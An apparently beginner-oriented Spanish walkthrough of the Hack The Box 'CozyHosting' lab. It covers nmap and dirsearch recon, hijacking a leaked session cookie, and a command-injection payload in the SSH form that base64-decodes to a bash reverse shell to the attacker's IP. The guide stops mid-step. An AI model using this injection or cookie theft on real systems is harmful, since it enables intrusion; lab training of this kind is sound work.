# CozyHosting Guia

En este repositorio se busca explicar paso a paso la búsqueda de la bandera. Pensé en crear esto para las personas nuevas en el mundo del hacking ético y que no se sientan tan abrumadas con tantos conceptos.

**Lo primero que haremos es identificar nuestra máquina que querremos atacar, que en este caso es la CozyHosting. Esta tiene la siguiente información:**

- **IP: 10.10.11.230**

## Editar el archivo /etc/hosts

Para comenzar, necesitamos editar nuestro archivo `/etc/hosts` utilizando el siguiente comando:

```
sudo nano /etc/hosts
```

- **`sudo`**: "sudo" es un comando en sistemas Unix y Linux que significa "superusuario do". Permite a un usuario ejecutar un comando con privilegios elevados, generalmente como el superusuario o administrador del sistema. El uso de "sudo" es necesario para editar archivos que requieren permisos de administrador, como el archivo `/etc/hosts`.

- **`nano`**: "nano" es un editor de texto en la línea de comandos. Es una herramienta simple y fácil de usar para editar archivos de texto en la terminal. En este caso, se utiliza para abrir y editar el archivo `/etc/hosts`.

- **`/etc/hosts`**: "/etc/hosts" es la ruta completa al archivo que estás tratando de abrir y editar. Este archivo es importante porque se utiliza para resolver nombres de host a direcciones IP en sistemas Unix y Linux. Cuando tu computadora intenta acceder a un sitio web o un recurso en la red, primero verifica si la dirección IP correspondiente está en este archivo antes de recurrir a un servidor DNS público. Agregar entradas en este archivo te permite personalizar la resolución de nombres en tu sistema local.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/856ef6b8-7ca9-41b1-85d2-c73c7b9f8cdd)

**Ya dentro, procedemos a agregar nuestra IP junto con la URL.**

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e9507dcf-d020-4aad-95be-1508f01a9262)

*(para guardar con Ctrl+O, Ctrl+X, yes, te preguntará si quieres cambiar el nombre, simplemente dale enter)*


![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/59792084-eb50-4ae9-939a-b4095ad38a13)

*Para comprobar que hicimos todo bien, podemos entrar a http://cozyhosting.htb. en resumen utilizar el comando "sudo nano /etc/hosts" es importante para personalizar la resolución de nombres en tu sistema local y permitirte acceder a máquinas o servicios específicos en entornos de CTF como Hack The Box, donde es común que los nombres de host y direcciones IP se utilicen de manera no convencional.*



## NMAP 

```
nmap -sS -sV -p- 10.10.11.230 -o cozyhosting
```
- **`Identificación de puertos abiertos (-p-)`**:La opción -p- le indica a Nmap que escanee todos los puertos posibles en el rango completo (1-65535). Esto es importante porque, en muchos casos, no sabes qué puertos pueden estar abiertos en la máquina objetivo. Al escanear todos los puertos, te aseguras de no pasar por alto ningún servicio o aplicación que pueda estar en ejecución.

- **`Escaneo de tipo SYN (-sS)`**:El escaneo de tipo SYN es un escaneo sigiloso y menos intrusivo. Envía paquetes SYN a los puertos y espera respuestas. Si recibe una respuesta SYN/ACK, sabe que el puerto está abierto. Si recibe un RST (restablecimiento) en respuesta, el puerto está cerrado. Este tipo de escaneo es útil para determinar la accesibilidad de los puertos sin establecer completamente la conexión, lo que podría dejar rastros en el servidor objetivo.

- **`Detección de servicios y versiones (-sV)`**: La opción -sV le permite a Nmap intentar detectar el servicio que se ejecuta en un puerto y, en algunos casos, incluso la versión específica del software. Esto es útil para identificar qué servicios están en funcionamiento en la máquina objetivo y conocer las vulnerabilidades asociadas a esas versiones específicas.

- **`Generación de un informe de resultados (-o)`**:Al utilizar la opción -o seguida de un nombre de archivo, puedes generar un informe de resultados que contiene los detalles del escaneo. Esto te permite registrar la información que obtuviste y revisarla posteriormente. Además, es útil para documentar tu progreso y compartir información con otros miembros de tu equipo en CTF.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b43b57da-65ea-4b44-8ae8-1c43d3c69ccd)
- **`Resultado(-o)`**:Hacer un escaneo Nmap con las opciones -sS -sV -p- en la dirección IP 10.10.11.230  es mportante en la fase de reconocimiento y enumeración de un CTF (Capture The Flag) en Hack The Box o en cualquier otro entorno de pruebas de penetración.


## Dirsearch 
```
dirsearch -u http://cozyhosting.htb/
```

- **`Deteccion de rutas`**:Esta herramienta se utiliza para buscar posibles rutas y recursos accesibles en un sitio web o servidor web. Aquí te explico por qué es importante utilizar dirsearch en un CTF de Hack The Box o en cualquier escenario de pruebas de penetración. Con poner la url del objetivo, ya podremos acceder a sus posibles rutas.

- - **`Si llegaras a tener problemas con el Dirsearch`**: Sigue los siguientes comando si el mismo Kali te niega instalarlo. 
  ```
    git clone https://github.com/maurosoria/dirsearch.git
  ```
  ```
  cd dirsearch
  ```
  ```
  python3 dirsearch.py -u http://cozyhosting.htb/
   ```
- Ya acabo el trabajo de Dirsearch, tendras un resultado como este
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4869a22d-4963-4b92-85ed-0fa89b44fc11)}
- Analizamos y encontraremos la siguiente ruta
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c3df4a7e-dfb8-4fff-9b24-f90132d437d8)
- A la cual accederemos con la URL que ya teniamos de CozyHosting. Lo que vemos son las sesiones y notamos que la de kanderson es la unica que no dice "no autorizado" y con un cookie que usaremos para engañar al login.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76305964-d943-4ac7-ac57-8df637e72b75)

## Inyección de Cookies
- Ya teniendo la informacion anterior, ya podemos acceder al panel. Esto lo haremos por medio de la inyeccion por cookies.
 **`¿Que es la inyeccion por cookies?**: se refiere a la manipulación maliciosa o indebida de las cookies en una aplicación web. Las cookies son pequeños fragmentos de datos que un servidor web envía al navegador del usuario para almacenar información, como sesiones de usuario, preferencias y estados de autenticación. Cuando las cookies no se manejan adecuadamente, pueden surgir vulnerabilidades que permiten a un atacante inyectar o modificar cookies para obtener un acceso no autorizado o realizar ataques dirigidos.
- Esto eran lo datos que habiamos sacados de http://cozyhosting.htb/actuator/sessions
- Ahora entramos a http://cozyhosting.htb/admin (Esta URL la sacamos del paso anterior)
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3c771f04-ef6a-4945-b340-6d6ca45bef60)

- Ingrsamos "inspeccionar codigo" y accedemos a Storange
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/410902b4-cd14-456c-aa82-9a0b843073bf)
- Remplazamos el valor que tiene , por el que sacamos en el paso anterior, dentro de http://cozyhosting.htb/actuator/sessions y la cookie de Kanderson.
- Ya agregada, refrescamos
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e6f834a9-6cee-4b8c-b18f-11f37db5d4f6)
- luego ponemos una usario y contraseña que sea igual por ambos lados. Usario:123 Contraseña:123
- Si hicimos todo bien ahora estamos dentro
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/94d52f93-8cc9-4b48-841d-19d6952e00f8)


## Burpsuite
- Ya teniendo el paso anterior. Toca escuchar las entradas del sitio web. Usaremos la herramienta de Burpsuite. Esta herramienta nos ayuda a escuchar el trafico que sufre el proxy. Para esto primero necesitamos.
  **`Cambiar el puerto proxy de nuestro navegador`**:La herramineta escucha por medio de la 127.0.0.1 y el puerto 8080, lo que necesitamos hacer es que en nuestro navegador agregaremos estas configuraciones
  ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7b2d3b5c-90f8-4eb4-8db1-e471dbce261a)
- Hacemos pruebas. Podemos repetir el paso anterior pero con el Burpsuite activo y ver como funciona. 

## inyección de shell
-Si revisamos la pagina, nos daremos cuenta que hay un apartado de SSH. Lo cual nos puede servir para entrar directamente a su servicio por medio de inyección de shell y Burpsuite
- **`¿Que es la inyección de shell?**:La inyección de comandos se refiere a una vulnerabilidad en la que un atacante puede insertar comandos maliciosos o instrucciones en una entrada de datos que luego se ejecutan en el sistema objetivo a través de una conexión SSH u otro protocolo.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)

- Procedemos a escribir 
- Usario:
 ```localhost```
-   Contraseña:
  ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;```
-   Ya ingresado, revisamos el Burpsuite
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/afc53d27-78bb-44ab-969f-e6c2fa362e4d)
- Click Derehco y send to repeater
- Si tarda en respondernos es buena señal
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/caff2d63-f748-4199-9633-e8fed77d0b35)
-Ahora iniciamos la virtual machine para descargar el jar python3 -m
```http.server 9999  ```
- El siguiente paso es saber nuestra ip, para ello usamos
- ```ifconfig ```
- La ip esta en ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/60f6410c-ddf6-4e72-a7a0-796317875ae1)

- La copiamos y lo pegamos
- Ya con la ip usamos este comando
```curl "TUIP BORRA LAS COMILLAS" :9999/cloudhosting-0.0.1.jar > cloudhosting.jar```
- Si todo salio bien, nos saldra algo asi. Lo que significa que se descargo con exito.
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76099734-7371-4c0e-b4e9-d967a80c2cfe)
- Luego buscamos donde esta el archivo con
```ls```
- El archivo se encuentra descargado
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/648326ce-04f0-478f-93a7-0f40a50fd1c1)
-La maquina que iniciamos nos lo confirma
![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a4f32b05-7bfa-4d10-b4ca-271be93cf83a)

- Al abrir el archvivo nos muestra lo siguiente
- 


      


